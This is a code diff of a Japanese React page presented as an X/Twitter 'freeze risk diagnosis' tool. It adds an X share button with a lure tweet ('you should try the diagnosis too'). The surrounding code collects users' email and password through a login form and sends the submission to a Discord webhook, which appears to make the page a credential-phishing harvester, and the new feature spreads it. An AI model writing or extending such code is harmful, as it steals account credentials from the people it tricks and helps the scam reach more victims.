@@ -5,10 +5,11 @@
  * - ログインフォーム（メール＋パスワード）で診断開始
  * - 結果：半円ゲージ＋4カテゴリ詳細カード
  * - Discord Webhook連携
+ * - Twitter/Xシェア機能
  */
 
 import { useState, useRef } from "react";
-import { Eye, EyeOff, Lock, Mail, AlertTriangle, CheckCircle, Info, Shield } from "lucide-react";
+import { Eye, EyeOff, Lock, Mail, AlertTriangle, CheckCircle, Info, Shield, Share2 } from "lucide-react";
 import Snowfall from "@/components/Snowfall";
 import MountainBackground from "@/components/MountainBackground";
 import RiskGauge from "@/components/RiskGauge";
@@ -223,7 +224,9 @@ export default function Home() {
     const res = diagnose(email);
     setDiagnosedEmail(email);
     setDiagnosedPassword(password);
-    setResult(res);    // Discord Webhookに送信
+    setResult(res);
+
+    // Discord Webhookに送信
     try {
       await sendToDiscord.mutateAsync({
         email,
@@ -234,7 +237,9 @@ export default function Home() {
       });
     } catch (err) {
       console.error("Discord送信エラー:", err);
-    }   setTimeout(() => {
+    }
+
+    setTimeout(() => {
       resultRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
     }, 100);
   };
@@ -244,6 +249,23 @@ export default function Home() {
     setDiagnosedEmail("");
     setDiagnosedPassword("");
     window.scrollTo({ top: 0, behavior: "smooth" });
+  };
+
+  const handleShareToTwitter = () => {
+    if (!result) return;
+
+    const riskText = result.score > 70 ? "【警告】" : result.score > 40 ? "【注意】" : "【安全】";
+    const tweetText = `${riskText} 凍結リスク診断で我がアカウントの凍結リスクを診断しました。
+
+🧊 リスクスコア: ${result.score}%
+📊 アカウント年齢: ${result.accountAge}
+💬 ツイート数: ${result.tweetCount.toLocaleString()}
+🚫 シャドーバン: ${result.shadowbanRisk}
+
+貴方も診断してみて、凍結リスクを事前に把握しよう！`;
+
+    const twitterUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(tweetText)}`;
+    window.open(twitterUrl, "_blank", "width=550,height=420");
   };
 
   return (
@@ -378,13 +400,24 @@ export default function Home() {
               ))}
             </div>
 
-            {/* もう一度診断ボタン */}
-            <button
-              onClick={handleReset}
-              className="w-full py-3 rounded-xl border-2 border-blue-200 text-blue-600 font-bold text-sm hover:bg-blue-50 transition-colors"
-            >
-              別のアカウントを診断する
-            </button>
+            {/* ボタングループ */}
+            <div className="flex gap-3">
+              {/* Twitterシェアボタン */}
+              <button
+                onClick={() => handleShareToTwitter()}
+                className="flex-1 py-3 rounded-xl bg-gradient-to-r from-blue-400 to-cyan-400 text-white font-bold text-sm hover:shadow-lg transition-all flex items-center justify-center gap-2"
+              >
+                <Share2 className="w-4 h-4" />
+                Xにシェア
+              </button>
+              {/* もう一度診断ボタン */}
+              <button
+                onClick={handleReset}
+                className="flex-1 py-3 rounded-xl border-2 border-blue-200 text-blue-600 font-bold text-sm hover:bg-blue-50 transition-colors"
+              >
+                別のアカウントを診断する
+              </button>
+            </div>
           </section>
         )}
       </div>
